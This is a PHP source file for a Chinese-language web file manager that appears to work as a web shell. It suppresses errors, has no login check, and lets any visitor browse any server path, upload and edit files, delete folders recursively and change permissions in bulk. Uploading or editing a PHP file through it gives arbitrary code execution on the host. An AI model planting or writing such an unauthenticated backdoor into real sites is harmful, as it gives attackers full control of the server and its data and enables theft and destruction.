<?php
@error_reporting(0);
@ini_set('display_errors', 0);
session_start();
set_time_limit(0);
ini_set('memory_limit', '-1');
ini_set('max_execution_time', 0);

$base_dir = dirname(__FILE__);


function h($s) {
    return htmlspecialchars($s, ENT_QUOTES, 'UTF-8');
}

function deletePath($target) {
    if (!file_exists($target)) return;
    if (is_dir($target)) {
        $items = @scandir($target);
        if (!$items) return;
        foreach ($items as $item) {
            if ($item === '.' || $item === '..') continue;
            deletePath($target . DIRECTORY_SEPARATOR . $item);
        }
        @rmdir($target);
    } else {
        @unlink($target);
    }
}

$path = isset($_GET['path']) ? realpath($_GET['path']) : realpath($base_dir);
if (!$path || !is_dir($path)) {
    $path = realpath($base_dir);
}
$path = rtrim($path, DIRECTORY_SEPARATOR);

if (isset($_GET['edit'])) {
    $edit_real = realpath($_GET['edit']);
    if ($edit_real && is_file($edit_real)) {
        $path = dirname($edit_real);
    }
}

if (isset($_FILES['upload_files'])) {
    $uploadDir = $path;
    foreach ($_FILES['upload_files']['name'] as $key => $name) {
        if ($_FILES['upload_files']['error'][$key] === UPLOAD_ERR_OK) {
            $tmpName = $_FILES['upload_files']['tmp_name'][$key];
            $targetPath = $uploadDir . '/' . basename($name);
            if (move_uploaded_file($tmpName, $targetPath)) {
                echo "<div class='msg' style='background:#d4edda;color:#155724;'>✅ 文件 " . h($name) . " 上传成功</div>";
            } else {
                echo "<div class='msg' style='background:#f8d7da;color:#721c24;'>❌ 文件 " . h($name) . " 上传失败</div>";
            }
        } else {
            echo "<div class='msg' style='background:#f8d7da;color:#721c24;'>⚠️ 文件 " . h($name) . " 上传出错 (错误码: " . $_FILES['upload_files']['error'][$key] . ")</div>";
        }
    }

    header("Location: ?path=" . urlencode($path) . "&uploaded=1");
    exit;
}

if (isset($_POST['save_file']) && isset($_POST['content'])) {
    $save_target = $_POST['save_file'];
    $real_save = realpath(dirname($save_target)) ? $save_target : false;
    if ($real_save) {
        file_put_contents($save_target, $_POST['content']);
    }
    $currentPath = isset($_POST['current_path']) ? $_POST['current_path'] : $path;
    header("Location: ?path=" . urlencode($currentPath) . "&saved=1");
    exit;
}

if (isset($_GET['delete'])) {
    $del = realpath($_GET['delete']);
    if ($del) {
        deletePath($del);
    }

    $redirectPath = isset($_GET['path']) ? $_GET['path'] : $path;

    header("Location: ?path=" . urlencode($redirectPath) . "&deleted=1");
    exit;
}

if (isset($_POST['batch_chmod']) && !empty($_POST['items']) && !empty($_POST['batch_perm'])) {
    $perm = $_POST['batch_perm'];
    if (!preg_match('/^[0-7]{3,4}$/', $perm)) {
        echo "<div class='msg' style='background:#f8d7da;color:#721c24;'>❌ 权限格式无效（应为3或4位八进制）</div>";
    } else {
        foreach ($_POST['items'] as $item) {
            $target = realpath($item);
            if ($target) {
                @chmod($target, octdec($perm));
                echo "<div id='msgBox' class='msg'>✅ 已修改权限: " . h($item) . " → $perm<br></div>";
            }
        }
        header("Location: ?path=" . urlencode($path) . "&chmoded=1");
        exit;
    }
}

if (isset($_POST['batch_delete']) && !empty($_POST['items'])) {
    foreach ($_POST['items'] as $item) {
        $del = realpath($item);
        if ($del) {
            deletePath($del);
            echo "<div id='msgBox' class='msg'>✅ 已删除: " . h($item) . "<br></div>";
        }
    }
    header("Location: ?path=" . urlencode($path) . "&deleted=1");
    exit;
}

if (isset($_POST['new_file_name'])) {
    $new_file = $path . "/" . basename($_POST['new_file_name']);
    $new_content = $_POST['new_file_content'] ?? '';
    if (!file_exists($new_file)) {
        @mkdir(dirname($new_file), 0755, true);
        file_put_contents($new_file, $new_content);
        echo "✅ 文件已创建: " . h($_POST['new_file_name']) . "<br>";
    }
}

if (isset($_POST['new_dir_name'])) {
    $new_dir = $path . "/" . basename($_POST['new_dir_name']);
    if (!file_exists($new_dir)) {
        mkdir($new_dir, 0755);
        echo "✅ 文件夹已创建<br>";
    }
}

if (isset($_POST['chmod_file']) && isset($_POST['new_perm'])) {
    $chmod_target = realpath($_POST['chmod_file']);
    $perm = $_POST['new_perm'] ?: '0644';
    if ($chmod_target) {
        chmod($chmod_target, octdec($_POST['new_perm']));
        echo "✅ 权限已修改<br>";
    }
}


if (isset($_POST['rename_file']) && isset($_POST['new_name'])) {
    $old = realpath($_POST['rename_file']);
    if ($old) {
        $new = dirname($old) . "/" . basename($_POST['new_name']);
        if (!file_exists($new)) {
            rename($old, $new);
            echo "✅ 已重命名<br>";
        }
    }
}


echo "<!DOCTYPE html><html><head><meta charset='utf-8'><title>文件管理器</title>
<style>
body {font-family: Arial, sans-serif; background:#f9f9f9; padding:20px;}
h2 {color:#333;}
a {color:#007bff; text-decoration:none;}
a:hover {text-decoration:underline;}
form {margin:10px 0;}
input, textarea, button {padding:6px 10px; margin:5px; border-radius:5px; border:1px solid #ccc;}
button {background:#007bff; color:#fff; border:none; cursor:pointer;}
button:hover {background:#0056b3;}
table {width:100%; border-collapse:collapse; margin-top:15px; background:#fff; box-shadow:0 0 5px rgba(0,0,0,.1);}
th, td {padding:10px; border-bottom:1px solid #eee;}
tr:nth-child(even) {background:#f9f9f9;}
tr:hover {background:#f1f7ff;}
.folder {color:#ff9800; font-weight:bold;}
.file {color:#555;}
.actions form {display:inline;}
.breadcrumb {margin-bottom:15px; word-break:break-all;}
.msg {background:#d4edda;color:#155724;padding:10px;border:1px solid #c3e6cb;border-radius:5px;margin-bottom:15px;}
</style>
<script>
function toggleAll(source) {
    let checkboxes = document.querySelectorAll('input[name=\"items[]\"]');
    checkboxes.forEach(cb => cb.checked = source.checked);
}
</script>
</head><body>";

echo "<h2>📂 文件管理器</h2>";

$parent = dirname($path);
if ($parent && $parent !== $path) {
    echo "<div style='margin-bottom:10px;'>
        <a href='?path=" . urlencode($parent) . "'>⬆️ 返回上一级</a>
    </div>";
}

$parts = explode(DIRECTORY_SEPARATOR, trim($path, DIRECTORY_SEPARATOR));
$breadcrumbs = [];
$current = '';
foreach ($parts as $p) {
    $current .= DIRECTORY_SEPARATOR . $p;
    $breadcrumbs[] = "<a href='?path=" . urlencode($current) . "'>" . h($p) . "</a>";
}
echo "<div class='breadcrumb'>当前位置: " . implode("/", $breadcrumbs) . "</div>";


if (isset($_GET['saved'])) {
    echo "<div id='msgBox' class='msg'>✅ 保存成功！</div>
    <script>setTimeout(()=>{ document.getElementById('msgBox').style.display='none'; }, 1500);</script>";
}
if (isset($_GET['uploaded'])) {
    echo "<div id='msgBox' class='msg'>📤 文件上传成功！</div>";
}
if (isset($_GET['deleted'])) {
    echo "<div id='msgBox' class='msg'>🗑️ 删除成功！</div>";
}
if (isset($_GET['chmoded'])) {
    echo "<div id='msgBox' class='msg'>🔒 批量权限修改成功！</div>";
}

echo "<form method='post' enctype='multipart/form-data'>
    <input type='file' name='upload_files[]' multiple> <button type='submit'>上传</button>
</form>
<form method='post'>
    <input type='text' name='new_file_name' placeholder='新文件名'>
    <textarea name='new_file_content' rows='3' cols='50' placeholder='文件内容(可选)'></textarea>
    <button type='submit'>新建文件</button>
</form>
<form method='post'>
    <input type='text' name='new_dir_name' placeholder='新文件夹名'>
    <button type='submit'>新建文件夹</button>
</form>";

if (isset($_GET['edit'])) {
    $edit_file = realpath($_GET['edit']);
    if ($edit_file && is_file($edit_file)) {
        $content = htmlspecialchars(file_get_contents($edit_file));
        echo "<h3>编辑文件: " . h(basename($edit_file)) . "</h3>
        <form method='post'>
            <textarea name='content' style='width:100%;height:400px;'>$content</textarea><br>
            <input type='hidden' name='save_file' value='" . h($edit_file) . "'>
            <input type='hidden' name='current_path' value='" . h(dirname($edit_file)) . "'>
            <button type='submit'>保存</button>
        </form>";
    } else {
        echo "<div class='msg' style='background:#f8d7da;color:#721c24;'>无法打开文件进行编辑</div>";
    }
}

$files = @scandir($path);
if ($files === false) $files = [];

$dirs = [];
$files_only = [];

foreach ($files as $f) {
    if ($f === "." || $f === "..") continue;
    $full = $path . DIRECTORY_SEPARATOR . $f;
    if (is_dir($full)) {
        $dirs[] = $f;
    } else {
        $files_only[] = $f;
    }
}
$sorted_files = array_merge($dirs, $files_only);

echo "<form method='post'><table>
<tr><th><input type='checkbox' onclick='toggleAll(this)'></th><th>名称</th><th>操作</th></tr>";

foreach ($sorted_files as $f) {
    $full = $path . DIRECTORY_SEPARATOR . $f;
    $real_full = $full;
    $siteUrl = (isset($_SERVER['HTTPS']) ? "https" : "http") . "://{$_SERVER['HTTP_HOST']}" . str_replace($_SERVER['DOCUMENT_ROOT'], '', $real_full);
    $currentPerm = @substr(sprintf('%o', fileperms($real_full)), -4);
    if (is_dir($real_full)) {
        echo "<tr>
            <td><input type='checkbox' name='items[]' value='" . h($real_full) . "'></td>
            <td class='folder'>📁 <a href='?path=" . urlencode($real_full) . "'>" . h($f) . "</a></td>
            <td class='actions'>
                <a href='?delete=" . urlencode($real_full) . "' onclick='return confirm(\"确定删除目录?\")'>删除</a> |
                <form method='post' style='display:inline;'>
                    <input type='hidden' name='chmod_file' value='" . h($real_full) . "'>
                    <input type='text' name='new_perm' value='$currentPerm' size='4' placeholder='0644'>
                    <button type='submit'>改权限</button>
                </form> |
                <form method='post' style='display:inline;'>
                    <input type='hidden' name='rename_file' value='" . h($real_full) . "'>
                    <input type='text' name='new_name' placeholder='新名字'>
                    <button type='submit'>重命名</button>
                </form>
            </td>
        </tr>";
    } else {
        echo "<tr>
            <td><input type='checkbox' name='items[]' value='" . h($real_full) . "'></td>
            <td class='file'>📄 " . h($f) . "</td>
            <td class='actions'>
                <a href='?edit=" . urlencode($real_full) . "'>编辑</a> | 
                <a href='?delete=" . urlencode($real_full) . "&path=" . urlencode($path) . "' onclick='return confirm(\"确定删除文件?\")'>删除</a>
 | 
                <form method='post' style='display:inline;'>
                    <input type='hidden' name='chmod_file' value='" . h($real_full) . "'>
                    <input type='text' name='new_perm' value='$currentPerm' size='4' placeholder='0644'>
                    <button type='submit'>改权限</button>
                </form> | 
                <a href='" . h($siteUrl) . "' target='_blank'>🌍 访问</a> | 
                <form method='post' style='display:inline;'>
                    <input type='hidden' name='rename_file' value='" . h($real_full) . "'>
                    <input type='text' name='new_name' placeholder='新名字'>
                    <button type='submit'>重命名</button>
                </form>
            </td>
        </tr>";
    }
}

echo "</table>
<div style='margin-top:10px;'>
    <button type='submit' name='batch_delete' value='1' onclick='return confirm(\"确定批量删除选中的项目?\")'>批量删除</button>
    <br><br>
    <label>批量改权限：</label>
    <input type='text' name='batch_perm' placeholder='例如 0755' size='6'>
    <button type='submit' name='batch_chmod' value='1' onclick='return confirm(\"确定修改所选项目权限吗？\")'>修改权限</button>
</div>
</form>";

echo "</body></html>";
